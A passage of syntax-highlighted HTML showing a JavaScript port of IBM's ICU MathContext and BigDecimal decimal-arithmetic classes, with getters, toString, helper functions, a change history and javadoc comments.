class="keyword">this</span>.digits=setdigits;</span><br><span class="line">  <span class="keyword">this</span>.form=setform;</span><br><span class="line">  <span class="keyword">this</span>.lostDigits=setlostdigits; <span class="comment">// [no bad value possible]</span></span><br><span class="line">  <span class="keyword">this</span>.roundingMode=setroundingmode;</span><br><span class="line">  <span class="keyword">return</span>;&#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Returns the digits setting.</span></span><br><span class="line"><span class="comment">  * This value is always non-negative.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @return an &lt;code&gt;int&lt;/code&gt; which is the value of the digits</span></span><br><span class="line"><span class="comment">  *         setting</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public int getDigits()&#123;</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">getDigits</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.digits;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Returns the form setting.</span></span><br><span class="line"><span class="comment">  * This will be one of</span></span><br><span class="line"><span class="comment">  * &#123;@link #ENGINEERING&#125;,</span></span><br><span class="line"><span class="comment">  * &#123;@link #PLAIN&#125;, or</span></span><br><span class="line"><span class="comment">  * &#123;@link #SCIENTIFIC&#125;.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @return an &lt;code&gt;int&lt;/code&gt; which is the value of the form setting</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public int getForm()&#123;</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">getForm</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.form;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Returns the lostDigits setting.</span></span><br><span class="line"><span class="comment">  * This will be either &lt;code&gt;true&lt;/code&gt; (enabled) or</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;false&lt;/code&gt; (disabled).</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @return a &lt;code&gt;boolean&lt;/code&gt; which is the value of the lostDigits</span></span><br><span class="line"><span class="comment">  *           setting</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public boolean getLostDigits()&#123;</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">getLostDigits</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.lostDigits;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Returns the roundingMode setting.</span></span><br><span class="line"><span class="comment">  * This will be one of</span></span><br><span class="line"><span class="comment">  * &#123;@link  #ROUND_CEILING&#125;,</span></span><br><span class="line"><span class="comment">  * &#123;@link  #ROUND_DOWN&#125;,</span></span><br><span class="line"><span class="comment">  * &#123;@link  #ROUND_FLOOR&#125;,</span></span><br><span class="line"><span class="comment">  * &#123;@link  #ROUND_HALF_DOWN&#125;,</span></span><br><span class="line"><span class="comment">  * &#123;@link  #ROUND_HALF_EVEN&#125;,</span></span><br><span class="line"><span class="comment">  * &#123;@link  #ROUND_HALF_UP&#125;,</span></span><br><span class="line"><span class="comment">  * &#123;@link  #ROUND_UNNECESSARY&#125;, or</span></span><br><span class="line"><span class="comment">  * &#123;@link  #ROUND_UP&#125;.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @return an &lt;code&gt;int&lt;/code&gt; which is the value of the roundingMode</span></span><br><span class="line"><span class="comment">  *         setting</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public int getRoundingMode()&#123;</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">getRoundingMode</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.roundingMode;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/** Returns the &lt;code&gt;MathContext&lt;/code&gt; as a readable string.</span></span><br><span class="line"><span class="comment">  * The &lt;code&gt;String&lt;/code&gt; returned represents the settings of the</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;MathContext&lt;/code&gt; object as four blank-delimited words</span></span><br><span class="line"><span class="comment">  * separated by a single blank and with no leading or trailing blanks,</span></span><br><span class="line"><span class="comment">  * as follows:</span></span><br><span class="line"><span class="comment">  * &lt;ol&gt;</span></span><br><span class="line"><span class="comment">  * &lt;li&gt;</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;digits=&lt;/code&gt;, immediately followed by</span></span><br><span class="line"><span class="comment">  * the value of the digits setting as a numeric word.</span></span><br><span class="line"><span class="comment">  * &lt;li&gt;</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;form=&lt;/code&gt;, immediately followed by</span></span><br><span class="line"><span class="comment">  * the value of the form setting as an uppercase word</span></span><br><span class="line"><span class="comment">  * (one of &lt;code&gt;SCIENTIFIC&lt;/code&gt;, &lt;code&gt;PLAIN&lt;/code&gt;, or</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;ENGINEERING&lt;/code&gt;).</span></span><br><span class="line"><span class="comment">  * &lt;li&gt;</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;lostDigits=&lt;/code&gt;, immediately followed by</span></span><br><span class="line"><span class="comment">  * the value of the lostDigits setting</span></span><br><span class="line"><span class="comment">  * (&lt;code&gt;1&lt;/code&gt; if enabled, &lt;code&gt;0&lt;/code&gt; if disabled).</span></span><br><span class="line"><span class="comment">  * &lt;li&gt;</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;roundingMode=&lt;/code&gt;, immediately followed by</span></span><br><span class="line"><span class="comment">  * the value of the roundingMode setting as a word.</span></span><br><span class="line"><span class="comment">  * This word will be the same as the name of the corresponding public</span></span><br><span class="line"><span class="comment">  * constant.</span></span><br><span class="line"><span class="comment">  * &lt;/ol&gt;</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * For example:</span></span><br><span class="line"><span class="comment">  * &lt;br&gt;&lt;code&gt;</span></span><br><span class="line"><span class="comment">  * digits=9 form=SCIENTIFIC lostDigits=0 roundingMode=ROUND_HALF_UP</span></span><br><span class="line"><span class="comment">  * &lt;/code&gt;</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * Additional words may be appended to the result of</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;toString&lt;/code&gt; in the future if more properties are added</span></span><br><span class="line"><span class="comment">  * to the class.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @return a &lt;code&gt;String&lt;/code&gt; representing the context settings.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public java.lang.String toString()&#123;</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">//--java.lang.String formstr=null;</span></span><br><span class="line">  <span class="keyword">var</span> formstr=<span class="literal">null</span>;</span><br><span class="line">  <span class="comment">//--int r=0;</span></span><br><span class="line">  <span class="keyword">var</span> r=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--java.lang.String roundword=null;</span></span><br><span class="line">  <span class="keyword">var</span> roundword=<span class="literal">null</span>;</span><br><span class="line">  &#123;<span class="comment">/*select*/</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">this</span>.form==<span class="keyword">this</span>.SCIENTIFIC)</span><br><span class="line">   formstr=<span class="string">"SCIENTIFIC"</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.form==<span class="keyword">this</span>.ENGINEERING)</span><br><span class="line">   formstr=<span class="string">"ENGINEERING"</span>;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">   formstr=<span class="string">"PLAIN"</span>;<span class="comment">/* form=PLAIN */</span></span><br><span class="line">  &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  &#123;<span class="keyword">var</span> $<span class="number">1</span>=<span class="keyword">this</span>.ROUNDS.length;r=<span class="number">0</span>;r:<span class="keyword">for</span>(;$<span class="number">1</span>&gt;<span class="number">0</span>;$<span class="number">1</span>--,r++)&#123;</span><br><span class="line">   <span class="keyword">if</span> (<span class="keyword">this</span>.roundingMode==<span class="keyword">this</span>.ROUNDS[r])</span><br><span class="line">    &#123;</span><br><span class="line">     roundword=<span class="keyword">this</span>.ROUNDWORDS[r];</span><br><span class="line">     <span class="keyword">break</span> r;</span><br><span class="line">    &#125;</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;<span class="comment">/*r*/</span></span><br><span class="line">  <span class="keyword">return</span> <span class="string">"digits="</span>+<span class="keyword">this</span>.digits+<span class="string">" "</span>+<span class="string">"form="</span>+formstr+<span class="string">" "</span>+<span class="string">"lostDigits="</span>+(<span class="keyword">this</span>.lostDigits?<span class="string">"1"</span>:<span class="string">"0"</span>)+<span class="string">" "</span>+<span class="string">"roundingMode="</span>+roundword;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="comment">/* &lt;sgml&gt; Test whether round is valid. &lt;/sgml&gt; */</span></span><br><span class="line"> <span class="comment">// This could be made shared for use by BigDecimal for setScale.</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--private static boolean isValidRound(int testround)&#123;</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">isValidRound</span>(<span class="params">testround</span>) </span>&#123;</span><br><span class="line">  <span class="comment">//--int r=0;</span></span><br><span class="line">  <span class="keyword">var</span> r=<span class="number">0</span>;</span><br><span class="line">  &#123;<span class="keyword">var</span> $<span class="number">2</span>=<span class="keyword">this</span>.ROUNDS.length;r=<span class="number">0</span>;r:<span class="keyword">for</span>(;$<span class="number">2</span>&gt;<span class="number">0</span>;$<span class="number">2</span>--,r++)&#123;</span><br><span class="line">   <span class="keyword">if</span> (testround==<span class="keyword">this</span>.ROUNDS[r])</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;<span class="comment">/*r*/</span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">return</span> MathContext;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> BigDecimal = (<span class="function"><span class="keyword">function</span> (<span class="params">MathContext</span>) </span>&#123;</span><br><span class="line"><span class="comment">/* Generated from 'BigDecimal.nrx' 8 Sep 2000 11:10:50 [v2.00] */</span></span><br><span class="line"><span class="comment">/* Options: Binary Comments Crossref Format Java Logo Strictargs Strictcase Trace2 Verbose3 */</span></span><br><span class="line"><span class="comment">//--package com.ibm.icu.math;</span></span><br><span class="line"><span class="comment">//--import java.math.BigInteger;</span></span><br><span class="line"><span class="comment">//--import com.ibm.icu.impl.Utility;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ------------------------------------------------------------------ */</span></span><br><span class="line"><span class="comment">/* BigDecimal -- Decimal arithmetic for Java                          */</span></span><br><span class="line"><span class="comment">/* ------------------------------------------------------------------ */</span></span><br><span class="line"><span class="comment">/* Copyright IBM Corporation, 1996, 2000.  All Rights Reserved.       */</span></span><br><span class="line"><span class="comment">/*                                                                    */</span></span><br><span class="line"><span class="comment">/* The BigDecimal class provides immutable arbitrary-precision        */</span></span><br><span class="line"><span class="comment">/* floating point (including integer) decimal numbers.                */</span></span><br><span class="line"><span class="comment">/*                                                                    */</span></span><br><span class="line"><span class="comment">/* As the numbers are decimal, there is an exact correspondence       */</span></span><br><span class="line"><span class="comment">/* between an instance of a BigDecimal object and its String          */</span></span><br><span class="line"><span class="comment">/* representation; the BigDecimal class provides direct conversions   */</span></span><br><span class="line"><span class="comment">/* to and from String and character array objects, and well as        */</span></span><br><span class="line"><span class="comment">/* conversions to and from the Java primitive types (which may not    */</span></span><br><span class="line"><span class="comment">/* be exact).                                                         */</span></span><br><span class="line"><span class="comment">/* ------------------------------------------------------------------ */</span></span><br><span class="line"><span class="comment">/* Notes:                                                             */</span></span><br><span class="line"><span class="comment">/*                                                                    */</span></span><br><span class="line"><span class="comment">/* 1. A BigDecimal object is never changed in value once constructed; */</span></span><br><span class="line"><span class="comment">/*    this avoids the need for locking.  Note in particular that the  */</span></span><br><span class="line"><span class="comment">/*    mantissa array may be shared between many BigDecimal objects,   */</span></span><br><span class="line"><span class="comment">/*    so that once exposed it must not be altered.                    */</span></span><br><span class="line"><span class="comment">/*                                                                    */</span></span><br><span class="line"><span class="comment">/* 2. This class looks at MathContext class fields directly (for      */</span></span><br><span class="line"><span class="comment">/*    performance).  It must not and does not change them.            */</span></span><br><span class="line"><span class="comment">/*                                                                    */</span></span><br><span class="line"><span class="comment">/* 3. Exponent checking is delayed until finish(), as we know         */</span></span><br><span class="line"><span class="comment">/*    intermediate calculations cannot cause 31-bit overflow.         */</span></span><br><span class="line"><span class="comment">/*    [This assertion depends on MAX_DIGITS in MathContext.]          */</span></span><br><span class="line"><span class="comment">/*                                                                    */</span></span><br><span class="line"><span class="comment">/* 4. Comments for the public API now follow the javadoc conventions. */</span></span><br><span class="line"><span class="comment">/*    The NetRexx -comments option is used to pass these comments     */</span></span><br><span class="line"><span class="comment">/*    through to the generated Java code (with -format, if desired).  */</span></span><br><span class="line"><span class="comment">/*                                                                    */</span></span><br><span class="line"><span class="comment">/* 5. System.arraycopy is faster than explicit loop as follows        */</span></span><br><span class="line"><span class="comment">/*      Mean length 4:  equal                                         */</span></span><br><span class="line"><span class="comment">/*      Mean length 8:  x2                                            */</span></span><br><span class="line"><span class="comment">/*      Mean length 16: x3                                            */</span></span><br><span class="line"><span class="comment">/*      Mean length 24: x4                                            */</span></span><br><span class="line"><span class="comment">/*    From prior experience, we expect mean length a little below 8,  */</span></span><br><span class="line"><span class="comment">/*    but arraycopy is still the one to use, in general, until later  */</span></span><br><span class="line"><span class="comment">/*    measurements suggest otherwise.                                 */</span></span><br><span class="line"><span class="comment">/*                                                                    */</span></span><br><span class="line"><span class="comment">/* 6. 'DMSRCN' referred to below is the original (1981) IBM S/370     */</span></span><br><span class="line"><span class="comment">/*    assembler code implementation of the algorithms below; it is    */</span></span><br><span class="line"><span class="comment">/*    now called IXXRCN and is available with the OS/390 and VM/ESA   */</span></span><br><span class="line"><span class="comment">/*    operating systems.                                              */</span></span><br><span class="line"><span class="comment">/* ------------------------------------------------------------------ */</span></span><br><span class="line"><span class="comment">/* Change History:                                                    */</span></span><br><span class="line"><span class="comment">/* 1997.09.02 Initial version (derived from netrexx.lang classes)     */</span></span><br><span class="line"><span class="comment">/* 1997.09.12 Add lostDigits checking                                 */</span></span><br><span class="line"><span class="comment">/* 1997.10.06 Change mantissa to a byte array                         */</span></span><br><span class="line"><span class="comment">/* 1997.11.22 Rework power [did not prepare arguments, etc.]          */</span></span><br><span class="line"><span class="comment">/* 1997.12.13 multiply did not prepare arguments                      */</span></span><br><span class="line"><span class="comment">/* 1997.12.14 add did not prepare and align arguments correctly       */</span></span><br><span class="line"><span class="comment">/* 1998.05.02 0.07 packaging changes suggested by Sun and Oracle      */</span></span><br><span class="line"><span class="comment">/* 1998.05.21 adjust remainder operator finalization                  */</span></span><br><span class="line"><span class="comment">/* 1998.06.04 rework to pass MathContext to finish() and round()      */</span></span><br><span class="line"><span class="comment">/* 1998.06.06 change format to use round(); support rounding modes    */</span></span><br><span class="line"><span class="comment">/* 1998.06.25 rename to BigDecimal and begin merge                    */</span></span><br><span class="line"><span class="comment">/*            zero can now have trailing zeros (i.e., exp\=0)         */</span></span><br><span class="line"><span class="comment">/* 1998.06.28 new methods: movePointXxxx, scale, toBigInteger         */</span></span><br><span class="line"><span class="comment">/*                         unscaledValue, valueof                     */</span></span><br><span class="line"><span class="comment">/* 1998.07.01 improve byteaddsub to allow array reuse, etc.           */</span></span><br><span class="line"><span class="comment">/* 1998.07.01 make null testing explicit to avoid JIT bug [Win32]     */</span></span><br><span class="line"><span class="comment">/* 1998.07.07 scaled division  [divide(BigDecimal, int, int)]         */</span></span><br><span class="line"><span class="comment">/* 1998.07.08 setScale, faster equals                                 */</span></span><br><span class="line"><span class="comment">/* 1998.07.11 allow 1E6 (no sign) &lt;sigh&gt;; new double/float conversion */</span></span><br><span class="line"><span class="comment">/* 1998.10.12 change package to com.ibm.icu.math                          */</span></span><br><span class="line"><span class="comment">/* 1998.12.14 power operator no longer rounds RHS [to match ANSI]     */</span></span><br><span class="line"><span class="comment">/*            add toBigDecimal() and BigDecimal(java.math.BigDecimal) */</span></span><br><span class="line"><span class="comment">/* 1998.12.29 improve byteaddsub by using table lookup                */</span></span><br><span class="line"><span class="comment">/* 1999.02.04 lostdigits=0 behaviour rounds instead of digits+1 guard */</span></span><br><span class="line"><span class="comment">/* 1999.02.05 cleaner code for BigDecimal(char[])                     */</span></span><br><span class="line"><span class="comment">/* 1999.02.06 add javadoc comments                                    */</span></span><br><span class="line"><span class="comment">/* 1999.02.11 format() changed from 7 to 2 method form                */</span></span><br><span class="line"><span class="comment">/* 1999.03.05 null pointer checking is no longer explicit             */</span></span><br><span class="line"><span class="comment">/* 1999.03.05 simplify; changes from discussion with J. Bloch:        */</span></span><br><span class="line"><span class="comment">/*            null no longer permitted for MathContext; drop boolean, */</span></span><br><span class="line"><span class="comment">/*            byte, char, float, short constructor, deprecate double  */</span></span><br><span class="line"><span class="comment">/*            constructor, no blanks in string constructor, add       */</span></span><br><span class="line"><span class="comment">/*            offset and length version of char[] constructor;        */</span></span><br><span class="line"><span class="comment">/*            add valueOf(double); drop booleanValue, charValue;      */</span></span><br><span class="line"><span class="comment">/*            add ...Exact versions of remaining convertors           */</span></span><br><span class="line"><span class="comment">/* 1999.03.13 add toBigIntegerExact                                   */</span></span><br><span class="line"><span class="comment">/* 1999.03.13 1.00 release to IBM Centre for Java Technology          */</span></span><br><span class="line"><span class="comment">/* 1999.05.27 1.01 correct 0-0.2 bug under scaled arithmetic          */</span></span><br><span class="line"><span class="comment">/* 1999.06.29 1.02 constructors should not allow exponent &gt; 9 digits  */</span></span><br><span class="line"><span class="comment">/* 1999.07.03 1.03 lost digits should not be checked if digits=0      */</span></span><br><span class="line"><span class="comment">/* 1999.07.06      lost digits Exception message changed              */</span></span><br><span class="line"><span class="comment">/* 1999.07.10 1.04 more work on 0-0.2 (scaled arithmetic)             */</span></span><br><span class="line"><span class="comment">/* 1999.07.17      improve messages from pow method                   */</span></span><br><span class="line"><span class="comment">/* 1999.08.08      performance tweaks                                 */</span></span><br><span class="line"><span class="comment">/* 1999.08.15      fastpath in multiply                               */</span></span><br><span class="line"><span class="comment">/* 1999.11.05 1.05 fix problem in intValueExact [e.g., 5555555555]    */</span></span><br><span class="line"><span class="comment">/* 1999.12.22 1.06 remove multiply fastpath, and improve performance  */</span></span><br><span class="line"><span class="comment">/* 2000.01.01      copyright update [Y2K has arrived]                 */</span></span><br><span class="line"><span class="comment">/* 2000.06.18 1.08 no longer deprecate BigDecimal(double)             */</span></span><br><span class="line"><span class="comment">/* ------------------------------------------------------------------ */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* JavaScript conversion (c) 2003 STZ-IDA and PTV AG, Karlsruhe, Germany */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">div</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (a-(a%b))/b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BigDecimal.prototype.div = div;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arraycopy</span>(<span class="params">src, srcindex, dest, destindex, length</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> i;</span><br><span class="line">    <span class="keyword">if</span> (destindex &gt; srcindex) &#123;</span><br><span class="line">        <span class="comment">// in case src and dest are equals, but also doesn't hurt</span></span><br><span class="line">        <span class="comment">// if they are different</span></span><br><span class="line">        <span class="keyword">for</span> (i = length<span class="number">-1</span>; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">            dest[i+destindex] = src[i+srcindex];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; length; ++i) &#123;</span><br><span class="line">            dest[i+destindex] = src[i+srcindex];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BigDecimal.prototype.arraycopy = arraycopy;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createArrayWithZeros</span>(<span class="params">length</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> retVal = <span class="keyword">new</span> <span class="built_in">Array</span>(length);</span><br><span class="line">    <span class="keyword">var</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; length; ++i) &#123;</span><br><span class="line">        retVal[i] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> retVal;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BigDecimal.prototype.createArrayWithZeros = createArrayWithZeros;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The &lt;code&gt;BigDecimal&lt;/code&gt; class implements immutable</span></span><br><span class="line"><span class="comment"> * arbitrary-precision decimal numbers.  The methods of the</span></span><br><span class="line"><span class="comment"> * &lt;code&gt;BigDecimal&lt;/code&gt; class provide operations for fixed and</span></span><br><span class="line"><span class="comment"> * floating point arithmetic, comparison, format conversions, and</span></span><br><span class="line"><span class="comment"> * hashing.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * As the numbers are decimal, there is an exact correspondence between</span></span><br><span class="line"><span class="comment"> * an instance of a &lt;code&gt;BigDecimal&lt;/code&gt; object and its</span></span><br><span class="line"><span class="comment"> * &lt;code&gt;String&lt;/code&gt; representation; the &lt;code&gt;BigDecimal&lt;/code&gt; class</span></span><br><span class="line"><span class="comment"> * provides direct conversions to and from &lt;code&gt;String&lt;/code&gt; and</span></span><br><span class="line"><span class="comment"> * character array (&lt;code&gt;char[]&lt;/code&gt;) objects, as well as conversions</span></span><br><span class="line"><span class="comment"> * to and from the Java primitive types (which may not be exact) and</span></span><br><span class="line"><span class="comment"> * &lt;code&gt;BigInteger&lt;/code&gt;.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * In the descriptions of constructors and methods in this documentation,</span></span><br><span class="line"><span class="comment"> * the value of a &lt;code&gt;BigDecimal&lt;/code&gt; number object is shown as the</span></span><br><span class="line"><span class="comment"> * result of invoking the &lt;code&gt;toString()&lt;/code&gt; method on the object.</span></span><br><span class="line"><span class="comment"> * The internal representation of a decimal number is neither defined</span></span><br><span class="line"><span class="comment"> * nor exposed, and is not permitted to affect the result of any</span></span><br><span class="line"><span class="comment"> * operation.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * The floating point arithmetic provided by this class is defined by</span></span><br><span class="line"><span class="comment"> * the ANSI X3.274-1996 standard, and is also documented at</span></span><br><span class="line"><span class="comment"> * &lt;code&gt;http://www2.hursley.ibm.com/decimal&lt;/code&gt;</span></span><br><span class="line"><span class="comment"> * &lt;br&gt;&lt;i&gt;[This URL will change.]&lt;/i&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;h3&gt;Operator methods&lt;/h3&gt;</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * Operations on &lt;code&gt;BigDecimal&lt;/code&gt; numbers are controlled by a</span></span><br><span class="line"><span class="comment"> * &#123;@link MathContext&#125; object, which provides the context (precision and</span></span><br><span class="line"><span class="comment"> * other information) for the operation. Methods that can take a</span></span><br><span class="line"><span class="comment"> * &lt;code&gt;MathContext&lt;/code&gt; parameter implement the standard arithmetic</span></span><br><span class="line"><span class="comment"> * operators for &lt;code&gt;BigDecimal&lt;/code&gt; objects and are known as</span></span><br><span class="line"><span class="comment"> * &lt;i&gt;operator methods&lt;/i&gt;.  The default settings provided by the</span></span><br><span class="line"><span class="comment"> * constant &#123;@link MathContext#DEFAULT&#125; (&lt;code&gt;digits=9,</span></span><br><span class="line"><span class="comment"> * form=SCIENTIFIC, lostDigits=false, roundingMode=ROUND_HALF_UP&lt;/code&gt;)</span></span><br><span class="line"><span class="comment"> * perform general-purpose floating point arithmetic to nine digits of</span></span><br><span class="line"><span class="comment"> * precision.  The &lt;code&gt;MathContext&lt;/code&gt; parameter must not be</span></span><br><span class="line"><span class="comment"> * &lt;code&gt;null&lt;/code&gt;.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * Each operator method also has a version provided which does</span></span><br><span class="line"><span class="comment"> * not take a &lt;code&gt;MathContext&lt;/code&gt; parameter.  For this version of</span></span><br><span class="line"><span class="comment"> * each method, the context settings used are &lt;code&gt;digits=0,</span></span><br><span class="line"><span class="comment"> * form=PLAIN, lostDigits=false, roundingMode=ROUND_HALF_UP&lt;/code&gt;;</span></span><br><span class="line"><span class="comment"> * these settings perform fixed point arithmetic with unlimited</span></span><br><span class="line"><span class="comment"> * precision, as defined for the original BigDecimal class in Java 1.1</span></span><br><span class="line"><span class="comment"> * and Java 1.2.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * For monadic operators, only the optional &lt;code&gt;MathContext&lt;/code&gt;</span></span><br><span class="line"><span class="comment"> * parameter is present; the operation acts upon the current object.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * For dyadic operators, a &lt;code&gt;BigDecimal&lt;/code&gt; parameter is always</span></span><br><span class="line"><span class="comment"> * present; it must not be &lt;code&gt;null&lt;/code&gt;.</span></span><br><span class="line"><span class="comment"> * The operation acts with the current object being the left-hand operand</span></span><br><span class="line"><span class="comment"> * and the &lt;code&gt;BigDecimal&lt;/code&gt; parameter being the right-hand operand.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * For example, adding two &lt;code&gt;BigDecimal&lt;/code&gt; objects referred to</span></span><br><span class="line"><span class="comment"> * by the names &lt;code&gt;award&lt;/code&gt; and &lt;code&gt;extra&lt;/code&gt; could be</span></span><br><span class="line"><span class="comment"> * written as any of:</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;code&gt;</span></span><br><span class="line"><span class="comment"> *     award.add(extra)</span></span><br><span class="line"><span class="comment"> * &lt;br&gt;award.add(extra, MathContext.DEFAULT)</span></span><br><span class="line"><span class="comment"> * &lt;br&gt;award.add(extra, acontext)</span></span><br><span class="line"><span class="comment"> * &lt;/code&gt;</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * (where &lt;code&gt;acontext&lt;/code&gt; is a &lt;code&gt;MathContext&lt;/code&gt; object),</span></span><br><span class="line"><span class="comment"> * which would return a &lt;code&gt;BigDecimal&lt;/code&gt; object whose value is</span></span><br><span class="line"><span class="comment"> * the result of adding &lt;code&gt;award&lt;/code&gt; and &lt;code&gt;extra&lt;/code&gt; under</span></span><br><span class="line"><span class="comment"> * the appropriate context settings.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * When a &lt;code&gt;BigDecimal&lt;/code&gt; operator method is used, a set of</span></span><br><span class="line"><span class="comment"> * rules define what the result will be (and, by implication, how the</span></span><br><span class="line"><span class="comment"> * result would be represented as a character string).</span></span><br><span class="line"><span class="comment"> * These rules are defined in the BigDecimal arithmetic documentation</span></span><br><span class="line"><span class="comment"> * (see the URL above), but in summary:</span></span><br><span class="line"><span class="comment"> * &lt;ul&gt;</span></span><br><span class="line"><span class="comment"> * &lt;li&gt;Results are normally calculated with up to some maximum number of</span></span><br><span class="line"><span class="comment"> * significant digits.</span></span><br><span class="line"><span class="comment"> * For example, if the &lt;code&gt;MathContext&lt;/code&gt; parameter for an operation</span></span><br><span class="line"><span class="comment"> * were &lt;code&gt;MathContext.DEFAULT&lt;/code&gt; then the result would be</span></span><br><span class="line"><span class="comment"> * rounded to 9 digits; the division of 2 by 3 would then result in</span></span><br><span class="line"><span class="comment"> * 0.666666667.</span></span><br><span class="line"><span class="comment"> * &lt;br&gt;</span></span><br><span class="line"><span class="comment"> * You can change the default of 9 significant digits by providing the</span></span><br><span class="line"><span class="comment"> * method with a suitable &lt;code&gt;MathContext&lt;/code&gt; object. This lets you</span></span><br><span 